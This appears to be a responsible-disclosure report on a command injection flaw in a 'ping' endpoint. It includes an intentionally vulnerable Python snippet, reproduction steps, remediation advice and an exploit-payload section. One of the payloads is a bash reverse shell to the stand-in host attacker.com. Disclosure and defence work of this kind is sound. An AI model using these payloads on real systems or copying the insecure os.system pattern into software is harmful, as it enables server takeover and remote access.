# 🐞 Command Injection Vulnerability Report

---

## 📌 Title

**Unauthenticated Command Injection via `host` Parameter**

---

## 📝 Description

A **Command Injection** vulnerability was identified in the `host` parameter of the application. This allows an attacker to inject arbitrary system-level commands that are executed on the server. The vulnerability exists due to improper input handling in a system call where user input is directly concatenated into an OS command.

---

## 🎯 Affected Endpoint

- **URL**: `https://vulnerable-website.com/ping?host=`
- **Method**: `GET`
- **Parameter**: `host`

---

## ⚙️ Vulnerable Code Example (Python)

```python
# ❌ Vulnerable Implementation
@app.route("/ping")
def ping():
    host = request.args.get("host")
    os.system("ping -c 4 " + host)
```

---

## 🧪 Steps to Reproduce

1. Open a browser or proxy tool like Burp Suite.
2. Navigate to the following URL to trigger basic functionality:

```
https://vulnerable-website.com/ping?host=127.0.0.1
```

3. Modify the request to inject a command:

```
https://vulnerable-website.com/ping?host=127.0.0.1;whoami
```

4. Observe the response showing server-side execution output, e.g.,

```
ping output...
www-data
```

✅ This confirms the vulnerability.

---

## 💣 Exploit Payloads

### 🔍 Basic Injection

```http
https://vulnerable-website.com/ping?host=127.0.0.1;id
```

### 🕵️‍♂️ List Files

```http
https://vulnerable-website.com/ping?host=127.0.0.1;ls+-la
```

### 📤 Reverse Shell (Linux)

```http
https://vulnerable-website.com/ping?host=127.0.0.1;bash+-c+'bash+-i+>&+/dev/tcp/attacker.com/4444+0>&1'
```

---

## 🔥 Impact

- Full system compromise
- File system access
- Sensitive file read (e.g., `/etc/passwd`)
- Reverse shell and remote persistence
- Privilege escalation (if service runs as root)
- Lateral movement in internal networks

---

## 🔧 Recommended Remediation

- **Never** use raw user input in system-level commands.
- Use parameterized functions and secure APIs.
- Validate input strictly using a whitelist.
- Sanitize input to block special characters (`;`, `&`, `|`, etc.).
- Use safe libraries like Python’s `subprocess.run` with argument lists:

```python
# ✅ Safe Example
subprocess.run(["ping", "-c", "4", host], check=True)
```

- Run services as a non-root user with limited privileges.

---

## 🔐 Security Best Practices

- Implement strict input validation and sanitization.
- Use allowlists over blocklists for parameters.
- Employ Web Application Firewalls (WAF).
- Regularly audit server logs for suspicious command execution.
- Run automated vulnerability scanners periodically.

---

## 🧾 References

- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GTFOBins - Linux Post-Exploitation](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Burp Suite, Manual Testing, cURL  
- **Severity**: Critical

---

> ⚠️ **Disclaimer**: This is a responsibly disclosed vulnerability. Please confirm and acknowledge. 